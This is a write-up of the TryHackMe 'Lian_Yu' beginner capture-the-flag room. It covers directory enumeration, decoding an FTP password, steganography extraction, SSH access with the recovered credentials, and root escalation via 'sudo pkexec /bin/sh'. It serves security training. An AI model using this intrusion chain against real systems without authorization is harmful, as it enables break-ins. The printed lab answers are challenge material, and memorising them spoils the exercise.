# [Lian_Yu](https://tryhackme.com/room/lianyu)

## A beginner level security challenge

# Find the Flags

### What is the Web Directory you found?

_In numbers_

1. Initial reconnaissance with nmap to identify open services and ports

```bash
nmap -sV <TARGET_IP>
```

<img width="724" height="214" alt="SCREEN01" src="https://github.com/user-attachments/assets/1fc0240f-1fa7-47dc-802f-e33358c6dd5c" />

2. Directory enumeration using gobuster with a standard wordlist followed by a custom numeric wordlist for the `/island` path
   - Directory found: `/island/2100`

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
seq 1000 9999 > numbers.txt
gobuster dir -u http://<TARGET_IP>/island -w numbers.txt
```

<img width="724" height="412" alt="SCREEN02" src="https://github.com/user-attachments/assets/d9d32181-ba34-478d-9e3b-703df2b346d2" />

<img width="723" height="413" alt="SCREEN03" src="https://github.com/user-attachments/assets/51f53a45-fd95-456f-a3d3-1c288b156154" />

---

### what is the file name you found?

_How would you search a file/directory by extension?_

1. File enumeration within the discovered directory using extension-specific search to identify ticket files
   - File found: `green_arrow.ticket`

```bash
gobuster dir -u http://<TARGET_IP>/island/2100 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```

<img width="720" height="411" alt="SCREEN04" src="https://github.com/user-attachments/assets/c5198106-dbc1-4154-8216-22c3740bf852" />

---

### what is the FTP Password?

_Looks like base? https://gchq.github.io/CyberChef/_

1. Analysis of the ticket file at `http://<TARGET_IP>/island/2100/green_arrow.ticket` reveals an encoded string `RTy8yhBQdscX`. Decoding this Base58 encoded string using [CyberChef](https://gchq.github.io/CyberChef/) yields the FTP password: `!#th3h00d`

<img width="821" height="527" alt="SCREEN05" src="https://github.com/user-attachments/assets/3f28fbde-cb70-4a92-84bb-7b659a0fbbad" />

---

### what is the file name with SSH password?

1. FTP credentials discovery requires examining the source code of `http://<TARGET_IP>/island/` to locate the username

   - FTP credentials: `vigilante:!#th3h00d`

2. FTP session to retrieve available files from the server

```bash
ftp <TARGET_IP>
ls -la
mget *
```

<img width="722" height="415" alt="SCREEN06" src="https://github.com/user-attachments/assets/2e9af690-31a4-4ee0-83ea-a3122a424fc7" />

3. File analysis reveals steganographic content requiring extraction. The corrupted PNG file header needs repair before steganographic analysis.
   - File containing SSH password: `shado`
   - SSH password extracted: `M3tahuman`

```bash
hexdump -C Leave_me_alone.png | head
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > fixed_Leave_me_alone.png
tail -c +9 Leave_me_alone.png >> fixed_Leave_me_alone.png
steghide extract -sf aa.jpg # password is password
```

---

### user.txt

1. SSH access using discovered credentials to retrieve the user flag.

```bash
ssh slade@<TARGET_IP>
cat /home/slade/user.txt
```

<img width="719" height="68" alt="SCREEN07" src="https://github.com/user-attachments/assets/84834133-a604-4065-96ca-cfead72566e6" />

---

### root.txt

1. Privilege escalation enumeration to identify sudo permissions and potential exploitation vectors

```bash
sudo -l
```

<img width="722" height="162" alt="SCREEN08" src="https://github.com/user-attachments/assets/fcfedd9b-6dbb-49db-9dba-82bf1fffa179" />

2. Exploitation using pkexec binary with sudo privileges. Reference [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec) for `pkexec` exploitation techniques

```bash
sudo pkexec /bin/sh
cat /root/root.txt
```

<img width="719" height="286" alt="SCREEN09" src="https://github.com/user-attachments/assets/4eb6eeb4-b067-41b9-9ec2-1f1811e93a1d" />
